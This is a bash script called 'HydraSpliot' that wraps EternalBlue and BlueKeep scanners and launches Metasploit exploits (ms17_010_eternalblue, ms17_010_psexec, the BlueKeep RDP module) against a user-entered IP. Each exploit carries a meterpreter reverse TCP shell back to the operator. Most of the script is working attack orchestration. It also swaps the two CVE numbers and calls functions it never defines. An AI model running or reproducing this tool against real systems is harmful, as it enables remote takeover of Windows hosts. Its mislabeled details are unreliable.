#!/bin/bash


#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"
#vars
n1="1"
n2="2"
n3="3"
n4="4"
n5="5"
n6="6"
n7="7"
n8="8"
b="Bluekeep Expliot - CVE-2017-0144"
e="Eternalblue Expliot - CVE-2019-0708"
r="RDP"
y="Y"
n="N"
pack1="Windows 7 / Windows Server 2008 : x64"
pack2="Windows Vista / Windows XP/ Windows 2000/Windows Server 2003"
pack3="Windows 8/  Windows 8.1/ Windows 10/ Windows Server2012 x64"
shell="Command Terminal: └─────►"
en="Enter"
loc_ip=$(ip addr show eth0 | awk '/inet / {print $2}' | cut -d/ -f 1)
#STARTUP


function exp(){
echo -e "$white[$green$n1$white] Select System  $yellow($green$pack1$yellow:$red$e$yellow)"
echo -e "$white[$green$n2$white] Select System $yellow($green$pack2$yellow:$red$e$yellow)"
echo -e "$white[$green$n3$white] Select System $yellow($green$pack3$yellow:$red$e$yellow)"
echo -e "$white[$green$n4$white] Select System $yellow($green$r$yellow:$blue$b$yellow)"
echo -e "$white[$green$n5$white] Back to Main Menu"

}







function back(){
	echo ""
	read -p "$(echo -e $red Back to Main Menu $white[$green$y$white/$green$n$white]$red : $nc)" q
		if [[ $q == 'y' ]] || [[ $q == 'Y' ]]
		then
	echo ""
	main
		else
	echo -e "\n$white[$green!$white] Exit$nc"
		exit 1
		fi

	}

function main(){

        toilet -w 80 -f slant HydraSpliot

            echo -e ""
            echo -e "Developed & Modified by Armand Kuger"
			echo -e ""

echo -e "$white[$green$n1$white] Scan Remote IP for Possible Expliotation $yellow($red$e$yellow/$blue$b$yellow)$nc"
echo -e "$white[$green$n2$white] Expliot Remote System - Meterpreter Reverse TCP Shell"
echo -e "$white[$green$n3$white] Exit\n"

read -p "$(echo -e $yellow$shell $nc)" ch

if [[ $ch == "1" ]]; then

echo -e "\n$white[$green$n1$white] $e$nc"
echo -e "$white[$green$n2$white] $b$nc"
echo -e "$white[$green$n3$white] Back to Main Menu $nc\n"

read -p "$(echo -e $yellow$shell $nc)" ch1

if [[ $ch1 == "1" ]]; then
echo ""
read -p "$(echo -e $white$en$green IP$white Address$green : $nc)" ip
python scanners/eternalblue_scanner.py $ip
back
elif [[ $ch1 == "2" ]]; then
echo ""
read -p "$(echo -e $white$en$green IP$white Address$green : $nc)" ipv4
python scanners/bluekeep_scanner.py --host $ipv4
back
elif [[ $ch1 == "3" ]]; then
clear
banner
main
else
echo -e "$white[$green!$white] Invalid Option Selected.$nc"
fi
elif [[ $ch == "2" ]]; then
echo -e "\n "
exp
echo -e "\n"
read -p "$(echo -e $yellow$shell $nc)" ch2
if [[ $ch2 == "1" ]]; then
echo ""
read -p "$(echo -e $white$en Vulnerable$green IP$white : $nc)" t1
msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue;
set payload windows/x64/meterpreter/reverse_tcp;
set lhost $loc_ip;
set rhost $t1;
exploit; "
elif [[ $ch2 == "2" ]]; then
echo ""
read -p "$(echo -e $white$en Vulnerable$green IP$white : $nc)" t2
msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec;
set payload windows/x64/meterpreter/reverse_tcp;
set lhost $loc_ip;
set rhost $t2;
exploit ;"
elif [[ $ch2 == "3" ]]; then
echo ""
read -p "$(echo -e $white$en Vulnerable$green IP$white : $nc)" t3
msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue_win8;
set payload windows/x64/meterpreter/reverse_tcp;
set lhost $loc_ip;
set rhost $t3;
exploit ;"
elif [[ $ch2 == "4" ]]; then
echo ""
read -p "$(echo -e $white$en Vulnerable$green IP$white : $nc)" t4
msfconsole -q -x " use windows/rdp/cve_2019_0708_bluekeep_rce;
set payload windows/x64/meterpreter/reverse_tcp;
set lhost $loc_ip;
set rhost $t4;
set groomsize 50;
set target 1;
exploit	;"
elif [[ $ch2 == "5" ]]; then
clear

main
else
echo -e "$white[$green!$white] Invalid Option Selected.$nc"
fi # of ch2
elif [[ $ch == "3" ]]; then
echo -e "\n$white[$green$n1$white]$red $e$nc"
echo -e "$white[$green$n2$white]$blue $b$nc"
echo -e "$white[$green$n3$white]$green Me$nc"
echo -e "$white[$green$n4$white] Back to Main Menu $nc\n"

read -p "$(echo -e $yellow$shell $nc)" ch3

if [[ $ch3 == "1" ]]; then
info_e
elif [[ $ch3 == "2" ]]; then
info_b
elif [[ $ch3 == "3" ]]; then
info_me
elif [[ $ch3 == "4" ]]; then
clear
banner
main
else
echo -e "$white[$green!$white] Invalid Option Selected.$nc"
fi

elif [[ $ch == "4" ]]; then
update
elif [[ $ch == "5" ]]; then
echo -e "$white[$green!$white] Quitting the Program.$nc"
else
echo -e "$white[$green!$white] invalid Option Selected.$nc"
fi

}
clear
main
